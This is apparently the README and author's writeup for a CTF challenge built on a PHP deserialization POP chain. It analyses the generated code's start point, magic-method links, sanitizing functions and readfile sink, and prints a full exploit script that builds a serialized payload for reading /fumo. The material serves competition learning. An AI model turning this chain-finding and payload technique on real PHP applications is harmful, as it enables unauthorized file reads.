# FUMO on the Christmas tree
~~致敬，都\*\*的是致敬~~
本题致敬了强网杯的`POP master`一题，并加强了难度。

# How to Start and Stop
## start
```shell
docker-compose up -d
```

## stop
```shell
docker-compose down --rmi all
```

# Writeup

很明显，应对16w行的代码，最高效的方法必然是自动化审计。

## 代码特征分析
我们下载下来代码先进行简单审计。发现整个代码有以下特征：
### 起点
整个代码中唯一的起点是`__destruct`，里面有`_GET`变量作为输入继续传递下去。

![image-20220101153936548](https://gitee.com/AFKL/image/raw/master/img/image-20220101153936548.png)

### 终点
整个代码中有多个类似的代码片段：`if(stripos([_GET], "/fumo") === 0) readfile(strtolower([_GET]));`。代码的目的是读取根目录的`/fumo`并输出至浏览器。那么猜测这里就是整个代码的终点。

另外一个比较难注意到的点。一部分节点会指向根节点，导致在一些情况下代码运行进入死循环。

### 中间
每个类有且只有一个公共方法。每个方法都会有将`_GET`变量的数据传递到下一个方法的代码片段（终点方法除外）。

#### 魔术方法
这些公共方法中有有些是魔法方法，共有以下几种：
  - `__invoke`
  - `__call`
  - `__destruct`（起点方法）
忽略唯一的起点方法，每个魔术方法内的代码都有固定的格式：

`__invoke`方法为：
```php
public function __invoke($value) {
    $key = base64_decode('VERHNGdO');
    @$this->gs8sn9lQ->TVPLXO($value[$key]);
}
```

`__call`方法的代码比较复杂，以下列出并分析：
```php
public function __call($name, $value) {
    // 将`$name`对应的变量的值，改为代码定死的值。这里将定死的值称为`a`
    extract([$name => 'XG4X73PzX']);
    /** 
     * 这里`$NwfyBTG6`的值从未指定，那么推测上面的`extract`函数便是对其赋值。
     * 另外`NwfyBTG6`是由`$name`变量指定的
     * 那么`NwfyBTG6`应当是上一个调用方法的名字
     */
    if (is_callable([$this->LCtWriB, $NwfyBTG6]))
        // 这里的`a`值被当作方法名被调用。那么`a`值所代表的就是下一个方法名
        call_user_func([$this->LCtWriB, $NwfyBTG6], ...$value);
}
```
那么整个代码便可以化简为：
```php
public function __call($name, $value) {
    if (is_callable([$this->LCtWriB, 'XG4X73PzX'])) @$this->LCtWriB->XG4X73PzX(...$value);
}
```

#### 普通方法
普通方法中进入下一层的代码片段有以下两种：
1. `@call_user_func($this->[a], ['[key]' => [_GET]]);`
2. `if (is_callable([$this->[a], '[b]'])) @$this->[a]->[b]($value);`

对于第一种，向下传递的`_GET`的值会变成一个键值对。会处理键值对的代码只有`__invoke`方法中有。
```php
public function __invoke($value) {
    $key = base64_decode('VERHNGdO'); // 获取键值
    // 将键值对的值取出传递到下一个方法
    @$this->gs8sn9lQ->TVPLXO($value[$key]);
}
```
同时`call_user_func`中的第一个参数也是一个属性，但这个属性的类型规定了是`object`，那么也可以推出，这里应当是调用`__invoke`方法。

对于第二种，代码会判断`[$this->[a], '[b]']`这个方法是否可调用。需要注意的是，`__call`方法可以使这个判断永久为`true`。

![image-20220101163613446](https://gitee.com/AFKL/image/raw/master/img/image-20220101163613446.png)

普通方法的代码也有固定格式，如下：
```php
public function f78sawV9g3($S34lPGS) {
    @$S34lPGS = $S34lPGS;
	if (is_callable([$this->YqV0xuthgr, 'NwfyBTG6'])) @$this->YqV0xuthgr->NwfyBTG6($S34lPGS);
	if (is_callable([$this->KEGAvw8KeX, 'si4Byp'])) @$this->KEGAvw8KeX->si4Byp($S34lPGS);
}
```
这里可以将代码的流向视为为二叉树，他们所指向的下一个节点是唯一的。

### 变量消毒
在普通方法中有以下几种会对变量消毒的方法。

#### 有效消毒
|消毒方法|对应代码|
|:-:|:-|
|md5|`@$input_value = md5($input_value);`|
|crypt|`@$input_value = crypt($input_value, 'rand_value');`|
|sha1|`@$input_value = sha1($input_value);`|
|无效值传递|`@$input_value = $rand_value;`|

#### 无效消毒
|消毒方法|对应代码|
|:-:|:-|
|str_rot13|`@$input_value = str_rot13($input_value);`|
|base64_decode|`@$input_value = base64_decode($input_value);`|
|strrev|`@$input_value = strrev($input_value);`|
|原值传递|`@$input_value = $input_value;`|

#### 特殊消毒
|消毒方法|对应代码|特殊原因|
|:-:|:-|:-|
|ucfirst|`@$input_value = ucfirst($input_value);`|在`base64_decode`前调用的话，如果`decode`的字符串第一个字母是小写，那么必定会解密失败|
|base64_encode|`@$input_value = base64_encode($input_value);`|在之后调用base64_decode的话就算无效消毒，没有调用便是有效消毒|

## 污点追踪

### 出题人自己的解法
可以看到，每个传递`_GET`值的代码片段的流向是唯一的。那么我们便可以通过此来构建一个表，来存储代码流向的键值对，在构建流向的时候只需要查表即可。

同时为了简化污点追踪的流程，我将关键点位的函数进行`hook`，并利用流向表对类属性进行替换赋值。在完成这些操作后我只需要将替换后的代码跑一次即可。

以下是我的`exp.php`代码分析，源码请见`exp`文件夹。
```php
<?php
$input = "/fumo";

$match_start = "/_GET\['(.*)'\]/i";
$match_normal = 'this->([A-Za-z0-9]+)->([A-Za-z0-9]+)\(.*?\);';
$match_invoke = 'call_user_func\(\$this->([A-Za-z0-9]+), \[\'([A-Za-z0-9/=]+)\' => \$[A-Za-z0-9]+\]\)';
$match_call_next_method_name = 'extract\(\[\$name => \'([A-Za-z0-9]+)\'\]\);';
$match_call_last_method_name = 'call_user_func\(\[\$this->([A-Za-z0-9]+), \$([A-Za-z0-9]+)\], \.\.\.\$value\)';

$filename = "./test.php";
$data_list = file($filename);
$data = file_get_contents($filename);

// 获取原生类的数量
$raw_class_len = count(get_declared_classes());
include_once("test.php");
// 获取导入class后的类数量
$class_list = get_declared_classes();
$class_list = array_splice($class_list, $raw_class_len);
$start_class = "";

// 构建流向表
$method_list = [];
foreach ($class_list as $key => $class) {
    if (method_exists($class, "__call")) {
        $call_start_line = (new ReflectionClass($class))->getMethods()[0]->getStartLine();
        $call_code = $data_list[$call_start_line + 2];
        preg_match("~$match_call_last_method_name~", $call_code, $match);
        $method_list['__call'][$match[2]] = $class;
    } else if (method_exists($class, "__invoke")) {
        $call_start_line = (new ReflectionClass($class))->getMethods()[0]->getStartLine();
        $call_code = $data_list[$call_start_line];
        preg_match("/base64_decode\('([A-Za-z0-9\/=]+)'\)/im", $call_code, $match);
        $method_list['__invoke'][$match[1]] = $class; // 可以通过获取传入__invoke值的键值构建
    } else {
        $re_class = new ReflectionClass($class);
        $method_name = $re_class->getMethods()[0]->name;
        $method_list['normal'][$method_name] = $class;
        if (method_exists($class, "__destruct")) {
            $start_class = $class; 
        }
    }
}

preg_match_all(
    "~$match_normal~",
    $data, $matches_normal
);

preg_match_all(
    "~$match_invoke~",
    $data, $matches_invoke
);

preg_match_all(
    "~$match_call_next_method_name~",
    $data, $matches_next_call
);

preg_match_all(
    "~$match_call_last_method_name~",
    $data, $matches_last_call
);

/**
 * 将对应的field进行赋值
 * e.g.
 * $this->aaa->aaa() => ($this->aaa = new aaa)->aaa()
 */
function set_field($field_name, $class_name, $data) {
    $class_name = str_replace("christmasTree\\", "", $class_name);
    return str_replace("\$this->$field_name", "(\$this->$field_name = new $class_name)", $data);
}

if($matches_normal || $matches_invoke || $matches_call){
    // 对普通方法进行处理
    foreach ($matches_normal[1] as $id => $field_name) {
        if (!empty($field_name)) {
            // 当下一个也是普通方法时
            $class_name = $method_list['normal'][$matches_normal[2][$id]];

            if ($class_name !== null) {
                $data = set_field($field_name, $class_name, $data);
                continue;
            }

            // 如果没有在普通方法表中没有找到，证明下一个是__call方法
            $class_name = $method_list['__call'][$matches_normal[2][$id]];

            if ($class_name !== null) {
                $data = set_field($field_name, $class_name, $data);
                continue;
            }
        } else {
            continue;
        }
    }

    // 对__invoke进行替换
    foreach ($matches_invoke[1] as $id => $field_name) {
        if (!empty($field_name)) {
            // 对key值解base64编码
            $invoke_key = base64_encode($matches_invoke[2][$id]);
            $class_name = $method_list['__invoke'][$invoke_key];
            if ($class_name !== null) {
                $invoke = new ReflectionMethod($class_name, '__invoke');
                $line_id = $invoke->getStartLine();
                if (strpos($data_list[$line_id], $invoke_key) !== false) {
                    $data = set_field($field_name, $class_name, $data);
                    continue;
                }
            }
        } else {
            continue;
        }
    }

    // 对__call方法进行处理
    foreach ($matches_last_call[1] as $id => $field_name) {
        if (!empty($field_name)) {
            $class_name = $method_list['normal'][$matches_next_call[1][$id]];
            if ($class_name !== null) {
                $data = set_field($field_name, $class_name, $data);
                continue;
            }
        } else {
            continue;
        }
    }
}

// 将普通函数替换为我们的hook函数，hook函数会将当前对象传入。
$data = str_replace(
    ["str_rot13(", "ucfirst(", "strrev(", "readfile(", "base64_decode($"],
    ["fake_str_rot13(\$this,", "fake_ucfirst(\$this,", "fake_strrev(\$this,", "fake_readfile(\$this,", "fake_base64_decode(\$this,$"],
    $data
);

preg_match($match_start, $data, $start);
$get_expr = $start[0];
$get_value = $start[1];

// 一些为了方便写的替换
$data = str_replace($get_expr, "input", $data);
$data = preg_replace("/function __destruct\(.*\)/i", "function start(\$input)", $data);

/**
 * 对已经执行过的进行标解，作用是防止返回根节点的代码。
 * 原理是新增一个静态变量，初始值是false，
 * 当第一次使用时判断是否为false，如果是便
 * 继续执行代码，并修改为true。当遇到返回
 * 根节点这样的环时，因为已经执行过一次，所
 * 以会直接return中断代码。
 */
$data = str_replace(" \n    public object", " public static \$is_used = false;\n    public object", $data);
$data = str_replace(") {\n", ") {\n\t\tif (!self::\$is_used) self::\$is_used = true; else return;\n", $data);

// 将替换完毕的代码写入另一个文件。
file_put_contents("./test-copy.php", $data);

$code = <<<CODE
<?php
\$input = '$input';
\$list = [];
\$real_list = [];
\$start = null;

function fake_base64_decode(\$value, \$a) {
    global \$list;
    \$list[get_class(\$value)] = 'base64_encode';
    return \$a;
}

function fake_str_rot13(\$value, \$a) {
    global \$list;
    \$list[get_class(\$value)] = 'str_rot13';
    return \$a;
}

function fake_ucfirst(\$value, \$a) {
    global \$list;
    \$list[get_class(\$value)] = 'lcfirst';
    return \$a;
}

function fake_strrev(\$value, \$a) {
    global \$list;
    \$list[get_class(\$value)] = 'strrev';
    return \$a;
}

function fake_readfile(\$value, \$a) {
    global \$input;
    global \$real_list;
    global \$list;
    global \$start;

    if (!empty(\$a) && is_string(\$a) && strpos(\$input, \$a) !== false) {
        \$last_class = new stdClass;
        foreach (debug_backtrace() as \$stack) {
            \$real_list[] = \$list[\$stack['class']];

            if (\$stack['class'] !== NULL) {
                \$start = new \$stack['class'];
                foreach (get_class_vars(\$stack['class']) as \$field => \$_) {
                    \$start->\$field = \$last_class;
                }
                \$last_class = \$start;
            }
        }
    }
}

include "./test-copy.php";
(new $start_class)->start(\$input);

\$real_value = \$input;
foreach (\$real_list as \$function) {
    if (\$function !== NULL) {
        \$real_value = \$function(\$real_value);
    }
}

var_dump(serialize(\$start));
var_dump(urlencode(serialize(\$start)));
var_dump("$get_value=".\$real_value);
CODE;

// 写入poc.php
file_put_contents("poc.php", $code);
```

```php
/* hook函数 */
<?php
$input = '/fumo';
$list = [];
$real_list = [];
$start = null;

//这些hook函数会记录自己调用的对象，并将其填入调用表中。
function fake_base64_decode($value, $a) {
    global $list;
    $list[get_class($value)] = 'base64_encode';
    return $a;
}

function fake_str_rot13($value, $a) {
    global $list;
    $list[get_class($value)] = 'str_rot13';
    return $a;
}

function fake_ucfirst($value, $a) {
    global $list;
    $list[get_class($value)] = 'lcfirst';
    return $a;
}

function fake_strrev($value, $a) {
    global $list;
    $list[get_class($value)] = 'strrev';
    return $a;
}

// 代表进入了终点
function fake_readfile($value, $a) {
    global $input;
    global $real_list;
    global $list;
    global $start;

	// 判断$input和传入的$a是否相同
    if (!empty($a) && is_string($a) && strpos($input, $a) !== false) {
        $last_class = new stdClass;
        // dump出当前调用栈
        foreach (debug_backtrace() as $stack) {
            $real_list[] = $list[$stack['class']];

            if ($stack['class'] !== NULL) {
                $start = new $stack['class'];
                foreach (get_class_vars($stack['class']) as $field => $_) {
                    $start->$field = $last_class;
                }
                $last_class = $start;
            }
        }
    }
}

// 开始执行代码
include "./test-copy.php";
(new christmasTree\WG7N5R3Mgx)->start($input);

// 对输入的值进行编码
$real_value = $input;
foreach ($real_list as $function) {
    if ($function !== NULL) {
        $real_value = $function($real_value);
    }
}

var_dump(serialize($start));
var_dump(urlencode(serialize($start)));
var_dump("W62OWE=".$real_value);
```

### 其它解法
我提取了前20名部分wp的代码，并放入`exp`文件夹中，欢迎大家学习。
因为是从pdf扒下来的，可能会有缩进问题，这里pdf也截图也一并放上。
如果你有更好的思路，欢迎提交PR与大家分享！

## 非预期

由于没有动态靶机，本题没有办法强制刷新代码。导致有的队友可以对同一代码进行长时间审计。某队伍通过眼看，硬审了16w行代码...

![焯](https://syimg.3dmgame.com/uploadimg/upload/image/20211210/20211210140951_97362.gif)

反正我心态是崩了...

# 代码生成器

详细代码可见`./server/code`。为了方便代码的生成，我将`php`部分抽象为类，利用`__str__`方法对代码进行生成。

在这里称变量没有被有效消毒的链为活链，变量被有效消毒的链为死链。

代码的生成逻辑如下：
1. 生成一条长度为20的活链，这里称为根链。
2. 在这条链的基础上，通过迭代产生更短的死链。
3. 在迭代的过程中，将死链拼接在链上，形成一条二叉树。
4. 随机将部分终点的`readfile`替换为指向根节点的代码片段。